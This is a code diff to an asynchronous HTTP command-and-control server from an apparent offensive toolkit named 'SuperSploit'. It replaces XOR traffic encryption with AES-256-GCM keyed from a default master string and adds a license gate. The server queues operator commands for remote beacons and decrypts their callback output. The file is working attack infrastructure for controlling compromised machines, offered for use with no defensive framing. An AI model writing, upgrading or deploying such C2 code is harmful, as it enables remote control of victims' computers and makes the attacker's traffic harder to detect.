@@ -2,10 +2,21 @@ import asyncio
 import base64
 import threading
 import sys
+import os
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    import hashlib
+    HAS_CRYPTO = True
+except ImportError:
+    print("[-] Error: 'cryptography' Python library required for AES-256 C2.")
+    print("[*] Please run: pip install cryptography")
+    sys.exit(1)
 
 # Framework integration: Try to get the XOR_KEY from the database if available
 try:
     from core.database import DatabaseManagment
+    from core.license_manager import LicenseManager
     db = DatabaseManagment.get()
     XOR_KEY = db.get("XOR_KEY", "SuperSploitKey").encode()
     PORT = int(db.get("LPORT", 8000))
@@ -13,14 +24,39 @@ except ImportError:
     XOR_KEY = b"SuperSploitKey"
     PORT = 8000
 
+    framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
+    if framework_root not in sys.path:
+        sys.path.append(framework_root)
+    try:
+        from core.license_manager import LicenseManager
+    except ImportError:
+        class LicenseManager:
+            @staticmethod
+            def gate_access(f):
+                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
+                print("[*] Standalone license validation failed. Please run via the main CLI.")
+                return False
+
 # Global asyncio queue for thread-safe task management
 task_queue = None
 
-def xor_crypt(data, key):
-    """Handles XOR encryption/decryption"""
+# Derive a 256-bit (32-byte) AES key from the framework's master string using SHA-256
+AES_KEY = hashlib.sha256(XOR_KEY).digest() if HAS_CRYPTO else b""
+
+def aes_encrypt(data, key):
+    """Handles AES-256-GCM encryption with dynamic 12-byte IV/Nonce"""
     if isinstance(data, str):
         data = data.encode()
-    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+    aesgcm = AESGCM(key)
+    nonce = os.urandom(12)
+    return nonce + aesgcm.encrypt(nonce, data, None)
+
+def aes_decrypt(data, key):
+    """Handles AES-256-GCM decryption with 12-byte IV prepended"""
+    aesgcm = AESGCM(key)
+    nonce = data[:12]
+    ciphertext = data[12:]
+    return aesgcm.decrypt(nonce, ciphertext, None)
 
 async def handle_client(reader, writer):
     """Asynchronous custom HTTP parser and handler"""
@@ -58,7 +94,7 @@ async def handle_client(reader, writer):
             # Check if a task is immediately available in the queue
             if not task_queue.empty():
                 task = task_queue.get_nowait()
-                response_body = base64.b64encode(xor_crypt(task, XOR_KEY))
+                response_body = base64.b64encode(aes_encrypt(task, AES_KEY))
                 task_queue.task_done()
                 
             response_headers = (
@@ -76,9 +112,9 @@ async def handle_client(reader, writer):
             if content_length > 0:
                 post_data = await reader.readexactly(content_length)
                 try:
-                    # 1. Base64 Decode and XOR Decrypt the response
+                    # 1. Base64 Decode and AES-256-GCM Decrypt the response
                     decoded_data = base64.b64decode(post_data)
-                    final_output = xor_crypt(decoded_data, XOR_KEY).decode('utf-8', errors='ignore')
+                    final_output = aes_decrypt(decoded_data, AES_KEY).decode('utf-8', errors='ignore')
 
                     print(f"\n[+] Beacon Callback Response:")
                     print("-" * 40)
@@ -122,7 +158,7 @@ async def main_server():
     
     server = await asyncio.start_server(handle_client, '0.0.0.0', PORT)
     print(f"[*] SuperSploit Async HTTP C2 Server listening on port {PORT}")
-    print(f"[*] XOR Key: {XOR_KEY.decode()}")
+    print(f"[*] Master Key (AES-256 Derived): {XOR_KEY.decode()}")
     print("[*] Asynchronous Tasking Enabled. Type commands below.")
     print("-" * 40)
     print("C2-Beacon> ", end="", flush=True)
@@ -136,6 +172,9 @@ def start_event_loop(loop):
     loop.run_until_complete(main_server())
 
 if __name__ == "__main__":
+    if not LicenseManager.gate_access("Async HTTP C2 Server"):
+        sys.exit(1)
+
     # Create the event loop and start it in a background daemon thread
     loop = asyncio.new_event_loop()
     server_thread = threading.Thread(target=start_event_loop, args=(loop,), daemon=True)
